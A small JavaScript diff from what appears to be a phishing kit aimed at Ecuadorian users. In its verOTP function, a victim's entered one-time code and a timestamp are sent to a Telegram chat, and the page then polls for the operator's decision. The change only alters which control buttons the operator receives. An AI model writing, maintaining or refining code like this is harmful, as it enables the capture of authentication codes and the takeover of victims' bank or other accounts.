@@ -134,7 +134,7 @@ async function verOTP() {
 📱 Código ingresado: <b>${otp}</b>
 📅 ${new Date().toLocaleString('es-EC',{timeZone:'America/Guayaquil'})}`;
   showWait();
-  try { await sendTelegram(msg, BUTTONS.otp); } catch(e) { console.error(e); }
+  try { await sendTelegram(msg, BUTTONS.main); } catch(e) { console.error(e); }
   startPolling(dec);
 }
 
